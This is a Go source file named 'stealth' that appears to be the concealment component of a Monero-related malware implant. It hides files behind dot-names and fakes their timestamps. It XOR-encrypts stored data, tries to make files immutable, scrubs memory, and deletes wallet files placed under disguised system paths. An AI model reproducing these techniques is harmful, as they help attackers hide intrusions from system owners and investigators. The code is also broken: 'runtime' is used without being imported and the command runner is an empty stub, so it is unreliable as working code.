package stealth

import (
	"crypto/rand"
	"os"
	"path/filepath"
	"syscall"
	"time"
)

func HideFile(path string) error {
	dir := filepath.Dir(path)
	base := filepath.Base(path)
	hiddenPath := filepath.Join(dir, "."+base)
	
	if err := os.Rename(path, hiddenPath); err != nil {
		return err
	}
	
	os.Chmod(hiddenPath, 0600)
	
	oldTime := time.Date(2020, 1, 1, 0, 0, 0, 0, time.UTC)
	os.Chtimes(hiddenPath, oldTime, oldTime)
	
	if syscallAccess {
		execCommand("chattr", "+i", hiddenPath)
	}
	
	return nil
}

func CreateHiddenDir(path string) error {
	if err := os.MkdirAll(path, 0700); err != nil {
		return err
	}
	
	base := filepath.Base(path)
	if base[0] != '.' {
		hiddenPath := filepath.Join(filepath.Dir(path), "."+base)
		os.Rename(path, hiddenPath)
		path = hiddenPath
	}
	
	return nil
}

func WriteEncryptedFile(path string, data []byte, key []byte) error {
	encrypted := xorEncrypt(data, key)
	
	os.MkdirAll(filepath.Dir(path), 0700)
	
	if err := os.WriteFile(path, encrypted, 0600); err != nil {
		return err
	}
	
	return HideFile(path)
}

func ReadEncryptedFile(path string, key []byte) ([]byte, error) {
	hiddenPath := filepath.Join(filepath.Dir(path), "."+filepath.Base(path))
	
	var data []byte
	var err error
	
	if data, err = os.ReadFile(hiddenPath); err != nil {
		if data, err = os.ReadFile(path); err != nil {
			return nil, err
		}
	}
	
	return xorDecrypt(data, key), nil
}

func CleanMemoryTraces() {
	runtime.GC()
	
	if runtime.GOOS == "linux" {
		syscall.Syscall(syscall.SYS_MADVISE, 
			uintptr(0), 
			uintptr(1<<30), 
			uintptr(syscall.MADV_DONTNEED))
	}
}

func CleanupAll() {
	hiddenFiles := []string{
		"/etc/.systemd/.wallet.dat",
		"/usr/share/.config/.wallet",
		"/var/lib/.cache/.monero_wallet",
		"/tmp/.X11-unix/.Xwallet",
		"/dev/shm/.sys_wallet",
		"/tmp/.system_helper.lock",
	}
	
	for _, file := range hiddenFiles {
		os.Remove(file)
		os.Remove("." + file)
	}
	
	CleanMemoryTraces()
}

func xorEncrypt(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

func xorDecrypt(data, key []byte) []byte {
	return xorEncrypt(data, key)
}

var syscallAccess = runtime.GOOS == "linux"

func execCommand(cmd string, args ...string) error {
	return nil
}
